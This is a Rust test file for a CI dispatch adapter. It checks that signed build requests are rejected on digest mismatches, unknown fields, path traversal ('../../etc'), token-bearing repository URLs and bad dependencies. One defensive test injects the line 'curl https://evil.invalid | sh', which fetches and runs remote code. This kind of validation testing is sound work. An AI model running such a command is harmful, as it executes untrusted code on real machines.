use std::collections::BTreeMap;

use serde_json::{json, Value};

use super::digest::{request_digest, stable_request_id};
use super::model::DispatchRequest;
use super::{adapt_dispatch, DISPATCH_SCHEMA};

const COMMIT: &str = "0123456789abcdef0123456789abcdef01234567";
const DIGEST_ONE: &str =
    "sha256:1111111111111111111111111111111111111111111111111111111111111111";
const DIGEST_TWO: &str =
    "sha256:2222222222222222222222222222222222222222222222222222222222222222";
const DIGEST_THREE: &str =
    "sha256:3333333333333333333333333333333333333333333333333333333333333333";

fn request() -> DispatchRequest {
    DispatchRequest {
        schema_version: DISPATCH_SCHEMA.to_string(),
        request_id: "gha:000000000000000000000000000000000000000000000000".to_string(),
        request_digest: DIGEST_ONE.to_string(),
        plan_digest: DIGEST_ONE.to_string(),
        profile_catalog_digest: DIGEST_TWO.to_string(),
        repository_url: "https://github.com/gha-indie-worker/example.git".to_string(),
        commit_sha: COMMIT.to_string(),
        job_instance_id: "build[1]".to_string(),
        base_job_id: "build".to_string(),
        job_order_index: 0,
        profile: "rust-verify".to_string(),
        profile_digest: DIGEST_THREE.to_string(),
        context_dir: "crates/core".to_string(),
        needs_instances: Vec::new(),
        matrix: BTreeMap::from([("rust".to_string(), json!("stable"))]),
        fail_fast: true,
        max_parallel: Some(2),
    }
}

fn signed_value(mut request: DispatchRequest) -> Value {
    request.request_id = stable_request_id(&request).unwrap();
    request.request_digest = request_digest(&request).unwrap();
    serde_json::to_value(request).unwrap()
}

#[test]
fn adapts_valid_dispatch_to_fixed_profile_envelope() {
    let source = signed_value(request());
    let adapted = adapt_dispatch(&source).unwrap().unwrap();
    assert_eq!(
        adapted.repository,
        "https://github.com/gha-indie-worker/example.git"
    );
    assert_eq!(adapted.revision, COMMIT);
    assert_eq!(adapted.profile, "rust-verify");
    assert_eq!(
        adapted.upstream_request["schemaVersion"].as_str(),
        Some("build-server.v1")
    );
    assert_eq!(
        adapted.upstream_request["jobKind"].as_str(),
        Some("run-profile")
    );
    assert_eq!(
        adapted.upstream_request["contextDir"].as_str(),
        Some("crates/core")
    );
    assert_eq!(
        adapted.upstream_request["requestId"].as_str(),
        Some(adapted.request_id.as_str())
    );
    assert!(adapted.upstream_request.get("matrix").is_none());
    assert!(adapted.upstream_request.get("needsInstances").is_none());
}

#[test]
fn rejects_stale_content_digest_and_identity() {
    let mut stale_identity = signed_value(request());
    stale_identity["contextDir"] = json!("crates/alternate");
    assert!(adapt_dispatch(&stale_identity)
        .unwrap_err()
        .contains("requestId does not match"));

    let mut stale_digest = request();
    stale_digest.request_id = stable_request_id(&stale_digest).unwrap();
    stale_digest.request_digest = DIGEST_ONE.to_string();
    assert!(
        adapt_dispatch(&serde_json::to_value(stale_digest).unwrap())
            .unwrap_err()
            .contains("requestDigest does not match")
    );
}

#[test]
fn immutable_identity_changes_with_all_bound_content() {
    let original = request();
    let original_id = stable_request_id(&original).unwrap();

    let mut changed_context = original.clone();
    changed_context.context_dir = "crates/alternate".to_string();
    assert_ne!(original_id, stable_request_id(&changed_context).unwrap());

    let mut changed_matrix = original.clone();
    changed_matrix
        .matrix
        .insert("rust".to_string(), json!("beta"));
    assert_ne!(original_id, stable_request_id(&changed_matrix).unwrap());

    let mut changed_profile = original.clone();
    changed_profile.profile = "node-verify".to_string();
    assert_ne!(original_id, stable_request_id(&changed_profile).unwrap());

    let mut changed_dependency = original;
    changed_dependency.needs_instances = vec!["prepare".to_string()];
    assert_ne!(original_id, stable_request_id(&changed_dependency).unwrap());
}

#[test]
fn rejects_unknown_fields_and_unsupported_schema_versions() {
    let mut source = signed_value(request());
    source["command"] = json!("curl https://evil.invalid | sh");
    assert!(adapt_dispatch(&source)
        .unwrap_err()
        .contains("unknown field"));

    let mut unsupported = signed_value(request());
    unsupported["schemaVersion"] = json!("gha-indie-worker.dispatch.v2");
    assert!(adapt_dispatch(&unsupported)
        .unwrap_err()
        .contains("unsupported indie dispatch schema"));
}

#[test]
fn rejects_mutable_revision_unsafe_paths_and_complex_matrix() {
    let mut mutable = request();
    mutable.commit_sha = "main".to_string();
    assert!(adapt_dispatch(&signed_value(mutable))
        .unwrap_err()
        .contains("commitSha"));

    let mut traversal = request();
    traversal.context_dir = "../../etc".to_string();
    assert!(adapt_dispatch(&signed_value(traversal))
        .unwrap_err()
        .contains("contextDir"));

    let mut credentials = request();
    credentials.repository_url = "https://token@github.com/example/repo.git".to_string();
    assert!(adapt_dispatch(&signed_value(credentials))
        .unwrap_err()
        .contains("repositoryUrl"));

    let mut complex = request();
    complex
        .matrix
        .insert("target".to_string(), json!({"os": "linux"}));
    assert!(adapt_dispatch(&signed_value(complex))
        .unwrap_err()
        .contains("must be a scalar"));
}

#[test]
fn rejects_duplicate_and_self_dependencies() {
    let mut duplicate = request();
    duplicate.needs_instances = vec!["prepare".to_string(), "prepare".to_string()];
    assert!(adapt_dispatch(&signed_value(duplicate))
        .unwrap_err()
        .contains("repeats concrete dependency"));

    let mut self_dependency = request();
    self_dependency.needs_instances = vec!["build[1]".to_string()];
    assert!(adapt_dispatch(&signed_value(self_dependency))
        .unwrap_err()
        .contains("current job"));
}

#[test]
fn leaves_legacy_build_server_envelopes_for_legacy_validation() {
    let legacy = json!({
        "schemaVersion": "build-server.v1",
        "jobKind": "run-profile"
    });
    assert!(adapt_dispatch(&legacy).unwrap().is_none());
}
